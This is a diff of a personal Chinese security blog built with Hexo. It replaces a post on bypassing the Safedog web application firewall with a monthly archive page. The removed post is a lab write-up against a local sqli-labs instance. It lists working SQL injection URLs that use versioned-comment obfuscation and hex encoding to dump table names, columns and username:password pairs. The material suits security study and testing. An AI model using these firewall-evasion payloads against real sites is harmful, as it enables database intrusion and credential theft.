@@ -21,31 +21,16 @@
     var CONFIG = {"hostname":"0w0.host","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0x00 起因  今天顾总给我们演示了如何过狗注入，嘻嘻嘻，当然要自己来一遍,当作交作业,嘻嘻嘻">
-<meta property="og:type" content="article">
-<meta property="og:title" content="过安全狗笔记">
-<meta property="og:url" content="http://0w0.host/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Sunr&#39;s Blog">
+<meta property="og:url" content="http://0w0.host/archives/2021/01/index.html">
 <meta property="og:site_name" content="Sunr&#39;s Blog">
-<meta property="og:description" content="0x00 起因  今天顾总给我们演示了如何过狗注入，嘻嘻嘻，当然要自己来一遍,当作交作业,嘻嘻嘻">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/KJdw1ZkQmYno7HL.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/dwyAWuFgOzPY9pt.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/K7MWNeQ1F4cTvsy.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/SDd8AnEi2pTfkCr.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/bWsE87KfT2GANSu.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/pOoEL9f4JPjyHkY.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/o3WipwlJPk659LT.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/ihqX5F6JVBYsvbm.png">
-<meta property="og:image" content="https://i.loli.net/2020/08/11/x126Eko5g34Dcrl.png">
-<meta property="article:published_time" content="2020-08-10T17:56:54.000Z">
-<meta property="article:modified_time" content="2020-08-12T04:54:47.458Z">
 <meta property="article:author" content="Sunr">
-<meta property="article:tag" content="笔记">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Network Security, Binary Security, Reverse Engineering, CTFer">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/08/11/KJdw1ZkQmYno7HL.png">
 
-<link rel="canonical" href="http://0w0.host/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/">
+<link rel="canonical" href="http://0w0.host/archives/2021/01/">
 
 
 <script id="page-configurations">
@@ -53,12 +38,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>过安全狗笔记 | Sunr's Blog</title>
+  <title>归档 | Sunr's Blog</title>
   
 
 
@@ -200,195 +185,56 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content archive">
             
 
-    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://0w0.host/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ar.jpg">
-      <meta itemprop="name" content="Sunr">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunr's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          过安全狗笔记
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-08-11 01:56:54" itemprop="dateCreated datePublished" datetime="2020-08-11T01:56:54+08:00">2020-08-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-12 12:54:47" itemprop="dateModified" datetime="2020-08-12T12:54:47+08:00">2020-08-12</time>
-              </span>
-
-          
-            <span id="/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/" class="post-meta-item leancloud_visitors" data-flag-title="过安全狗笔记" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
   
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.7k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+  <div class="post-block">
+    <div class="posts-collapse">
+      <div class="collection-title">
+        <span class="collection-header">嗯..! 目前共计 14 篇日志。 继续努力。</span>
+      </div>
 
       
-        <blockquote>
-<p>0x00 起因</p>
-</blockquote>
-<p>今天顾总给我们演示了如何过狗注入，嘻嘻嘻，当然要自己来一遍,当作交作业,嘻嘻嘻</p>
-<a id="more"></a>
-<blockquote>
-<p>0x01 开始</p>
-</blockquote>
-<p>测试点: sqli-lab Less-2</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1</code></p>
-<p><img src="https://i.loli.net/2020/08/11/KJdw1ZkQmYno7HL.png" alt="1.png"></p>
-<p>既然看了顾总的演示,第一步的order by当然要改成group by,成功探测只有三个</p>
-<p>之后便是绕掉<code>SELECT</code>关键字,这里顾总说的是用<code>/*! */</code>注释绕掉成功,这里给44344点赞</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!44344select*/ 1,2,3 limit 1,1 --+</code></p>
-<p><img src="https://i.loli.net/2020/08/11/dwyAWuFgOzPY9pt.png" alt="2.png"></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database()*/,/*!44190user()*/</code></p>
-<p>之后发现database()怎么都绕不过,我不知道我是不是演示的时候画面卡没注意这个细节,所以分别试了绕database和(),然后用<code>/*!44190database/*!()*/*/</code></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/*/,/*!44190user/*!()*/*/</code></p>
-<p>又爆语法错误,看了半天错误信息发现多了<code>*/</code>然后直接删掉括号后一个后成功</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/,/*!44190user/*!()*/</code></p>
-<p><img src="https://i.loli.net/2020/08/11/K7MWNeQ1F4cTvsy.png" alt="3.png"></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(table_name),3 /*!25244from*/ information_schema.tables where table_schema=/*!44190database/*!()*/ limit 1,1 -- jsij</code></p>
-<p>爆表名成功</p>
-<p><img src="https://i.loli.net/2020/08/11/SDd8AnEi2pTfkCr.png" alt="4.png"></p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name= &#39;users &#39; limit 1,1 -- jsij</code></p>
-<p><img src="https://i.loli.net/2020/08/11/bWsE87KfT2GANSu.png" alt="5.png"></p>
-<p>卧槽,明明没有错</p>
-<p><img src="https://i.loli.net/2020/08/11/pOoEL9f4JPjyHkY.png" alt="6.png"></p>
-<p>不过很明显输出多了两个<code>/</code>嗯,绕了绕过不去,再看了源码,不过没有转义的函数,不过还是应该是sql把单引号转义掉了,就把<code>users</code>Hex转义成<code>0x7573657273</code>之后测试成功</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name=0x7573657273 limit 1,1 -- jsij</code></p>
-<p><img src="https://i.loli.net/2020/08/11/o3WipwlJPk659LT.png" alt="7.png"></p>
-<p>再来查字段,成功</p>
-<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(username,0x3a,password),3 /*!25244from*/ users limit 1,1 -- jsij</code></p>
-<p><img src="https://i.loli.net/2020/08/11/ihqX5F6JVBYsvbm.png" alt="8.png"></p>
-<blockquote>
-<p>0x02 后记</p>
-</blockquote>
-<p>虽然只是复现了顾总的操作,不过依旧很多坑,非常难受</p>
-<p><img src="https://i.loli.net/2020/08/11/x126Eko5g34Dcrl.png" alt="9.png"></p>
-<p>还是这么多条记录,不过幸不辱命还是完成了</p>
-<p>不过这里转义单引号这个事,原因是当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。PHP 5.4 之前 PHP 指令 magic_quotes_gpc 默认是 on.</p>
-
+    <div class="collection-year">
+      <span class="collection-header">2021</span>
     </div>
 
-    <div>
-      
-      <div>
-    
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-      
-    </div>
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
 
-    
-    
-    
-        
+      <div class="post-meta">
+        <time itemprop="dateCreated"
+              datetime="2021-01-27T00:57:31+08:00"
+              content="2021-01-27">
+          01-27
+        </time>
+      </div>
 
-  <div class="followme">
-    <p>欢迎关注我的其它发布渠道</p>
-
-    <div class="social-list">
-
-        <div class="social-item">
-          <a target="_blank" class="social-link" href="/atom.xml">
-            <span class="icon">
-              <i class="fa fa-rss"></i>
-            </span>
-
-            <span class="label">RSS</span>
+      <div class="post-title">
+          <a class="post-title-link" href="/2021/01/27/%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url">
+            <span itemprop="name">导入表学习笔记</span>
           </a>
-        </div>
+      </div>
+
+    </header>
+  </article>
+
+
     </div>
   </div>
-
-
-      <footer class="post-footer">
-          
-          <div class="post-tags">
-              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
-              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/08/09/sqli-lab-Less-1-Less-10/" rel="prev" title="sqli-lab Less 1-Less 10">
-      <i class="fa fa-chevron-left"></i> sqli-lab Less 1-Less 10
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/08/30/sqli-lab-Less-11-Less-22/" rel="next" title="sqli-lab Less 11-Less 22">
-      sqli-lab Less 11-Less 22 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
   
   
+  
+
   
 
 
 
           </div>
           
-    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -667,16 +513,6 @@ if (document.querySelectorAll('pre.mermaid').length) {
   
 
   
-  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
-  <script>
-      window.addEventListener('load', () => {
-      quicklink({
-        timeout : 3000,
-        priority: true,
-        ignores : [uri => uri.includes('#'),uri => uri === 'http://0w0.host/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/',]
-      });
-      });
-  </script>
 
 
 <script>
